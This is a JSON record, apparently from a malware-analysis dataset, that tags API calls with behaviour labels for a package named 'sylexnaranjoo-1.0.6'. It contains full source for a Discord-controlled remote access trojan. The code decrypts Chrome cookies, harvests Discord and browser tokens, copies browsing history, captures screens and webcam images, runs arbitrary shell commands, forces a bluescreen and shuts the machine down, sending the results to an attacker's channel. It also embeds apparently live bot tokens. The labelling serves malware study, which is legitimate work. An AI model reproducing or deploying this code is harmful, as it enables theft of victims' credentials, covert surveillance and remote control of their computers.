          "second_id": "window_management",
          "third_id": "window_control"
        },
        {
          "api_name": "subprocess.check_call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "getpass.getuser",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "discord.Embed",
          "id": "create_discord_embed",
          "description": "Creates Discord embed object with specified content",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Embed.set_thumbnail",
          "id": "set_discord_thumbnail",
          "description": "Sets thumbnail image for Discord embed",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "discord.Context.send",
          "id": "send_discord_embed",
          "description": "Sends embed message to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "ImageGrab.grab",
          "id": "capture_screen_region",
          "description": "Captures screenshot of specified screen region",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "screen_capture"
        },
        {
          "api_name": "PIL.Image.Image.save",
          "id": "save_image_file",
          "description": "Saves image to file in PNG format",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "image_processing"
        },
        {
          "api_name": "discord.File",
          "id": "create_discord_file_path",
          "description": "Creates Discord file object from specified path",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Context.send",
          "id": "send_discord_file",
          "description": "Sends file to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "discord.Embed",
          "id": "create_discord_embed",
          "description": "Creates Discord embed object with specified content",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Embed.add_field",
          "id": "add_discord_embed_field",
          "description": "Adds field to Discord embed",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "discord.Context.send",
          "id": "send_discord_embed",
          "description": "Sends embed message to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "wincl.Dispatch",
          "id": "create_speech_com",
          "description": "Creates COM object for speech synthesis",
          "first_id": "persistence_stealth",
          "second_id": "user_interaction",
          "third_id": "speech_synthesis"
        },
        {
          "api_name": "wincl.Dispatch.Speak",
          "id": "speak_text",
          "description": "Speaks provided text using system voice",
          "first_id": "persistence_stealth",
          "second_id": "user_interaction",
          "third_id": "speech_synthesis"
        },
        {
          "api_name": "discord.Context.send",
          "id": "send_discord_message",
          "description": "Sends message to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "cv2.VideoCapture",
          "id": "create_video_capture",
          "description": "Creates video capture object for default camera",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "camera_operations"
        },
        {
          "api_name": "cv2.VideoCapture.read",
          "id": "read_video_frame",
          "description": "Reads frame from video capture device",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "camera_operations"
        },
        {
          "api_name": "cv2.imwrite",
          "id": "save_image_file",
          "description": "Saves image to file in PNG format",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "image_processing"
        },
        {
          "api_name": "cv2.VideoCapture.release",
          "id": "release_video_device",
          "description": "Releases video capture device",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "camera_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "PIL.Image.open",
          "id": "open_image_buffer",
          "description": "Opens image from in-memory bytes buffer",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "io.BytesIO",
          "id": "create_memory_bytes",
          "description": "Creates in-memory bytes buffer from encoded string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "byte_encoding"
        },
        {
          "api_name": "PIL.Image.Image.save",
          "id": "save_image_buffer",
          "description": "Saves image to in-memory buffer in PNG format",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "image_processing"
        },
        {
          "api_name": "discord.File",
          "id": "create_discord_file_memory",
          "description": "Creates Discord file object from in-memory image",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "discord.Context.send",
          "id": "send_discord_file_message",
          "description": "Sends file and message to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "discord.Bot.run",
          "id": "run_discord_bot",
          "description": "Runs the Discord bot with provided token",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_control"
        }
      ],
      "contextual_code": "from colorama import init\ninit()\n\nintents = discord.Intents.default()\nintents.members = True\nintents.message_content = True\nbot = commands.Bot(command_prefix='!', help_command=None, intents=intents)\n\nasync def run_bot():\n    await bot.start(\"OTEzMTgzNTI4NTQ2NjExMjQy.GHlayo.bMDO5rucURNnYdhn4YMdB-uiJIvvMfwvy_PVqY\")\n    hwnd = win32gui.FindWindow(None, \"window_title\")\n    win32gui.ShowWindow(hwnd, win32gui.SW_MINIMIZE)\n\ndef tahg(pene):\n    x = json.loads(open(os.environ['LOCALAPPDATA'] + \"\\\\Google\\\\Chrome\\\\User Data\\\\Local State\", \"r\", encoding=\"utf-8\").read())\n    try:\n        mk = win32crypt.CryptUnprotectData(base64.b64decode(x[\"os_crypt\"][\"encrypted_key\"])[5:], None, None, None, 0)[1]\n    except:\n        mk = \"\"\n    try:\n       return (AES.new(mk, AES.MODE_GCM, pene[3:15]).decrypt(pene[15:])[:-16]).decode()\n    except:\n        return \"\"\n\n@bot.command()\nasync def getcookies(ctx):\n    get_chrome_cookies()\n    await ctx.send(file=discord.File(os.environ['TEMP'] + \"\\\\cookies.txt\"))\n    await ctx.send(\"[*] Command successfully executed\")\ndef get_chrome_cookies():\n    shutil.copyfile(os.environ['LOCALAPPDATA'] + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies\", os.environ['TEMP'] + \"\\\\asd\")\n    con = sqlite3.connect(os.environ['TEMP'] + \"\\\\asd\")\n    cursor = con.cursor()\n    cursor.execute(\"SELECT host_key, name, value, encrypted_value FROM cookies\")\n    file = open(os.environ['TEMP'] + \"\\\\cookies.txt\", \"w+\")\n    for cookie in cursor.fetchall():\n        file.write(f\"{cookie[0]} - {cookie[1]} - {cookie[2]} - {tahg(cookie[3])}\\n\")\n    cursor.close()\n    con.close()\n    file.close()\n\n@bot.command()\nasync def screenshot(ctx):\n    image = ImageGrab.grab()\n    with io.BytesIO() as image_binary:\n        image.save(image_binary, 'PNG')\n        image_binary.seek(0)\n        file = discord.File(image_binary, filename='screenshot.png')\n        await ctx.send(file=file)\n    await ctx.send(\"[*] Command successfully executed\")\n\n@bot.event\nasync def on_ready():\n    guild_id = 1070633873374986271\n    guild = bot.get_guild(guild_id)\n    if guild is None:\n        print(f\"No se pudo encontrar un servidor con el ID {guild_id}\")\n        return\n    channel_name = os.getlogin()\n    channel = await guild.create_text_channel(channel_name)\n    system_info = f\"**OS**: {platform.system()} {platform.release()}\\n**CPU**: {platform.processor()}\"\n    ip_address = socket.gethostbyname(socket.gethostname())\n    embed = discord.Embed(title=\"Nuevo Usuario Infectado\", description=f\"**Usuario:** {channel_name}\\n**IP:** {ip_address}\", color=0x000000)\n    embed.set_thumbnail(url='https://media.discordapp.net/attachments/847380398283685919/1079575682193031188/tumblr_n4dhaindMe1ste05mo1_400.gif')\n    await channel.send(embed=embed)\n\n@bot.command()\nasync def shell(ctx, *args):\n    command = ' '.join(args)\n    try:\n        output = subprocess.check_output(command, shell=True).decode('cp1252')\n    except subprocess.CalledProcessError as e:\n        output = e.output.decode('cp1252')\n    embed = discord.Embed(title=\"Shell Output\", description=output)\n    await ctx.send(embed=embed)\n\n@bot.command()\nasync def history(ctx):\n    import sqlite3\n    import os\n    import time\n    import shutil\n    temp = (os.getenv('TEMP'))\n    Username = (os.getenv('USERNAME'))\n    shutil.rmtree(temp + r\"\\history12\", ignore_errors=True)\n    os.mkdir(temp + r\"\\history12\")\n    path_org = r''' \"C:\\\\Users\\\\{}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History\" '''.format(Username)\n    path_new = temp + r\"\\history12\"\n    copy_me_to_here = ((\"copy\" + path_org + \"\\\"{}\" ).format(path_new))\n    os.system(copy_me_to_here)\n    con = sqlite3.connect(path_new + r\"\\history\")\n    cursor = con.cursor()\n    cursor.execute(\"SELECT url FROM urls\")\n    urls = cursor.fetchall()\n    for x in urls:\n        done = (\"\".join(x))\n        f4 = open(temp + r\"\\history12\" + r\"\\history.txt\", 'a')\n        f4.write(str(done))\n        f4.write(str(\"\\n\"))\n        f4.close()\n    con.close()\n    file = discord.File(temp + r\"\\history12\" + r\"\\history.txt\", filename=\"history.txt\")\n    await ctx.send(\"[*] Command successfully executed\", file=file)\n    def deleteme() :\n        path = \"rmdir \" + temp + r\"\\history12\" + \" /s /q\"\n        os.system(path)\n    deleteme()\n\n@bot.command()\nasync def wallpaper(ctx):\n    import ctypes\n    import os\n    path = os.path.join(os.getenv('TEMP') + r\"\\temp.jpg\")\n    await ctx.message.attachments[0].save(path)\n    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)\n    await ctx.send(\"[*] Command successfully executed\")\n\n@bot.command()\nasync def message(ctx, *args):\n    import ctypes\n    import time\n    MB_YESNO = 0x04\n    MB_HELP = 0x4000\n    ICON_STOP = 0x10\n    def mess():\n        ctypes.windll.user32.MessageBoxW(0, ' '.join(args), \"Error\", MB_HELP | MB_YESNO | ICON_STOP)\n    import threading\n    messa = threading.Thread(target=mess)\n    messa._running = True\n    messa.daemon = True\n    messa.start()\n    import win32con\n    import win32gui\n    def get_all_hwnd(hwnd,mouse):\n        def winEnumHandler(hwnd, ctx):\n            if win32gui.GetWindowText(hwnd) == \"Error\":\n                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)\n                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)\n                win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  \n                win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)\n                return None\n            else:\n                pass\n        if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):\n            win32gui.EnumWindows(winEnumHandler,None)\n    await ctx.send(\"[*] Command successfully executed\")\n    win32gui.EnumWindows(get_all_hwnd, 0)\n\n@bot.command()\nasync def bluescreen(ctx):\n    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))\n    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))\n\n@bot.command()\nasync def descargar(ctx, *args):\n    command = ' '.join(args)\n    try:\n        subprocess.check_call(command, shell=True)\n        subprocess.check_call(command, shell=True)\n        user = getpass.getuser()\n        embed = discord.Embed(title=f\"Descarga Exitosa ({user})\", color=0x00FF00, description=\"La descarga se completó correctamente en tu PC.\")\n        embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')\n    except subprocess.CalledProcessError as e:\n        embed = discord.Embed(title=\"Error al Descargar\", color=0xFF0000, description=\"No se pudo completar la descarga. Revisa si ingresaste los comandos correctamente.\")\n        embed.set_thumbnail(url='https://media.discordapp.net/attachments/820440347724742686/1074937767143936070/IMG_20230209_023618.jpg?width=473&height=473')\n    await ctx.send(embed=embed)\n\n@bot.command()\nasync def cam(ctx):\n    ImageGrab.grab(bbox=(0,0,640,480)).save('camera.png', 'PNG')\n    await ctx.send(file=discord.File('camera.png'))\n\n@bot.command()\nasync def stop(ctx):\n    os.system(\"shutdown /s /t 1\")\n\ndef get_account_name(token):\n    headers = {\n        \"Authorization\": token,\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299\"\n    }\n    try:\n        r = requests.get(\"https://discord.com/api/v9/users/@me\", headers=headers)\n        return r.json()[\"username\"] + \"#\" + r.json()[\"discriminator\"]\n    except:\n        return \"Unknown\"\n\n@bot.command()\nasync def tokens(ctx):\n    paths = [\n        os.path.join(os.getenv(\"APPDATA\"), \".discord\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \".discordcanary\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \".discordptb\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Google\", \"Chrome\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Google\", \"Chrome SxS\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"Microsoft\", \"Edge\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"LOCALAPPDATA\"), \"BraveSoftware\", \"Brave-Browser\", \"User Data\", \"Default\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera Stable\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera GX Stable\", \"Local Storage\", \"leveldb\"),\n        os.path.join(os.getenv(\"APPDATA\"), \"Opera Software\", \"Opera\", \"Local Storage\", \"leveldb\"),\n    ]\n    tokens = []\n    for path in paths:\n        if not os.path.exists(path):\n            continue\n        for file in os.listdir(path):\n            if not file.endswith(\".log\") and not file.endswith(\".ldb\"):\n                continue\n            for line in [x.strip() for x in open(os.path.join(path, file), errors=\"ignore\").readlines() if x.strip()]:\n                for regex in [r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}\", r\"mfa\\.[\\w-]{84}\"]:\n                    for token in re.findall(regex, line):\n                        account_name = get_account_name(token)\n                        tokens.append((account_name, token))\n    if not tokens:\n        await ctx.send(\"No se encontraron tokens.\")\n    else:\n        embed = discord.Embed(title=\"Tokens encontrados:\", color=0xfafafa)\n        for token in tokens:\n            account_name = token[0]\n            token = token[1]\n            embed.add_field(name=account_name, value=f\"```{token}```\", inline=False)\n        await ctx.send(embed=embed)\n\n@bot.command()\nasync def voice(ctx):\n    volumeup()\n    speak = wincl.Dispatch(\"SAPI.SpVoice\")\n    speak.Speak(ctx.message.content[7:])\n    await ctx.send(\"[*] Command successfuly executed\")\n\n@bot.command()\nasync def webcampic(ctx):\n    temp = os.getenv('TEMP')\n    cap = cv2.VideoCapture(0)\n    ret, frame = cap.read()\n    cv2.imwrite(temp + r\"\\temp.png\", frame)\n    cap.release()\n    with open(temp + r\"\\temp.png\", \"rb\") as image_file:\n        img = Image.open(io.BytesIO(image_file.read()))\n    img_byte_arr = io.BytesIO()\n    img.save(img_byte_arr, format='PNG')\n    img_byte_arr = img_byte_arr.getvalue()\n    file = discord.File(io.BytesIO(img_byte_arr), filename=\"temp.png\")\n    await ctx.send(\"[*] Command successfully executed\", file=file)\n\nbot.run(\"OTEzMTgzNTI4NTQ2NjExMjQy.GTqtPh.G5URGlnI54swuJ83yKJScF9CDZPrSuhWOvM9M4\")"
    }
  },
  {
    "metadata": {
      "package_name": "sylexnaranjoo-1.0.6"
    }
  }
]